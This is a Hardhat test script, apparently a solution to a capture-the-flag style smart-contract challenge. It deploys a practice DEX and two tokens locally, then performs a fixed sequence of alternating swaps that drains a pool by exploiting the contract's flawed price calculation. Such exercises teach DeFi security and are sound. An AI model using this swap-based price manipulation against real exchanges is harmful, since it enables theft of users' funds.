import { time } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber } from "ethers";

describe("Dex1 Exploit", function () {
  let accounts = null;

  let player;
  let swapToken1: Contract;
  let swapToken2: Contract;
  let dex: Contract;

  async function checkBalances() {
    let b1 = await dex
      .connect(player)
      .balanceOf(swapToken1.address, dex.address);
    let b2 = await dex
      .connect(player)
      .balanceOf(swapToken2.address, dex.address);
    let b3 = await dex
      .connect(player)
      .balanceOf(swapToken1.address, player.address);
    let b4 = await dex
      .connect(player)
      .balanceOf(swapToken2.address, player.address);

    console.log(b1, b2, b3, b4);
  }

  async function swap1(amount: number) {
    let tx = await dex
      .connect(player)
      .swap(swapToken1.address, swapToken2.address, amount);
    await tx.wait();
  }

  async function swap2(amount: number) {
    let tx = await dex
      .connect(player)
      .swap(swapToken2.address, swapToken1.address, amount);
    await tx.wait();
  }

  before(async () => {
    const dexFactory = await ethers.getContractFactory("Dex");
    dex = await dexFactory.deploy();
    await dex.deployed();

    const swapTokenFactory = await ethers.getContractFactory("SwappableToken");
    swapToken1 = await swapTokenFactory.deploy(
      dex.address,
      "token2",
      "TK2",
      110
    );
    await swapToken1.deployed();
    swapToken2 = await swapTokenFactory.deploy(
      dex.address,
      "token2",
      "TK2",
      110
    );
    await swapToken2.deployed();

    accounts = await ethers.getSigners();
    player = accounts[0];

    let tx = await dex
      .connect(player)
      .setTokens(swapToken1.address, swapToken2.address);
    await tx.wait();

    tx = await dex.connect(player).approve(dex.address, 1000000);
    await tx.wait();
    tx = await dex.connect(player).addLiquidity(swapToken1.address, 100);
    await tx.wait();
    tx = await dex.connect(player).addLiquidity(swapToken2.address, 100);
    await tx.wait();

    tx = await dex.connect(player).renounceOwnership();
    await tx.wait();
  });

  describe("dex1", function () {
    it("Swap and Show", async () => {
      await checkBalances();
      await swap1(10);
      await checkBalances();
      await swap2(20);
      await checkBalances();
      await swap1(24);
      await checkBalances();
      await swap2(30);
      await checkBalances();
      await swap1(41);
      await checkBalances();
      //await swap2(65);
      await swap2(45);
      await checkBalances();
    });
  });
});
